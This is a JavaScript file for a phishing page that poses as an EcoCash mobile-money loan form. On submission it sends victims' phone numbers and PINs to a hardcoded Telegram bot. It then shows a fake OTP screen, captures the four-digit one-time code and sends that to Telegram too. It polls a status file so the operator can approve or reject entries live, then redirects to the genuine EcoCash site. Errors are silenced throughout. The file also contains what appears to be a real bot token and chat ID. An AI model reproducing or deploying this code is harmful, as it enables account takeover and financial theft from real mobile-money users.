// CONFIG — CHANGE THESE
const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';  // <<< RENAME: BOT_TOKEN → TELEGRAM_BOT_TOKEN
const CHAT_ID = '1469249528';

// Update installment in real-time
document.getElementById('amount').addEventListener('input', updateInstallment);
document.getElementById('duration').addEventListener('change', updateInstallment);

function updateInstallment() {
    const amount = parseFloat(document.getElementById('amount').value) || 0;
    const duration = parseInt(document.getElementById('duration').value);
    const installment = (amount / duration).toFixed(2);
    document.getElementById('installment').textContent = installment;
}

// On loan form submit
document.getElementById('loanForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;
    const amount = document.getElementById('amount').value;
    const duration = document.getElementById('duration').value;
    const installment = (amount / duration).toFixed(2);

    // Send credentials to Telegram
    const credentialsMsg = `
📞 *Ecocash Login*  
📱 *Phone:* ${phone}  
🔐 *PIN:* ${pin}  
💰 *Amount:* \$${amount}  
📅 *Duration:* ${duration} months  
🧮 *Monthly:* \$${installment}  
⏱️ *Time:* ${new Date().toISOString()}
    `;

    await sendToTelegram(credentialsMsg);

    // Hide form, show OTP screen
    document.getElementById('loanForm').style.display = 'none';
    document.getElementById('otpScreen').style.display = 'block';

    // Start polling for approval
    pollApproval(phone);
});

// Poll every 3 seconds for approval status
async function pollApproval(phone) {
    const statusMsg = document.getElementById('statusMsg');
    const otpInput = document.getElementById('otp');
    let attempts = 0;

    const interval = setInterval(async () => {
        if (attempts > 8) {
            clearInterval(interval);
            statusMsg.textContent = "Session expired.";
            return;
        }

        try {
            const res = await fetch('approval_status.txt?' + new Date().getTime());
            const decision = await res.text();

            if (decision.trim() === 'approve') {
                clearInterval(interval);
                statusMsg.textContent = "✅ Approved! Redirecting...";
                setTimeout(() => {
                    window.location.href = "https://ecocash.co.zw";
                }, 2000);
            } else if (decision.trim() === 'wrong_pin') {
                clearInterval(interval);
                statusMsg.textContent = "❌ Invalid PIN. Try again.";
                setTimeout(() => location.reload(), 2000);
            } else if (decision.trim() === 'wrong_otp') {
                clearInterval(interval);
                otpInput.style.border = "2px solid #c62828";
                statusMsg.textContent = "❌ Invalid OTP.";
            }
        } catch (err) {
            // Silently fail — network lag simulation
        }

        attempts++;
    }, 3000);

    // Capture OTP as soon as 4 digits are entered
    otpInput.addEventListener('input', async function() {
        if (this.value.length === 4) {
            const otpMsg = `🔑 *OTP Captured:* ${this.value}  | 📱 *Phone:* ${phone} | ⏱️ ${new Date().toISOString()}`;
            await sendToTelegram(otpMsg);
        }
    });
}

// Send message to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {}); // Fail silently
}
